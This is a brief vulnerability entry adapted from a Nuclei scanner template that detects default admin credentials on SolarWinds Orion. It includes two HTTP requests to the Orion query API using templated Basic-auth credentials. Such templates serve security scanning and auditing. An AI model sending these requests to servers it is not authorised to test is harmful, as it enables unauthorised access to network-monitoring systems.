# Nuclei Template: SolarWinds Orion Default Login
**Template ID:** solarwinds-default-admin
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`solarwinds-default-login.yaml`)

## Vulnerability Information & PoC

## Description
SolarWinds Orion default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /SolarWinds/InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username)}}

GET /InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username)}}
```

## References
- https://github.com/solarwinds/OrionSDK/wiki/REST
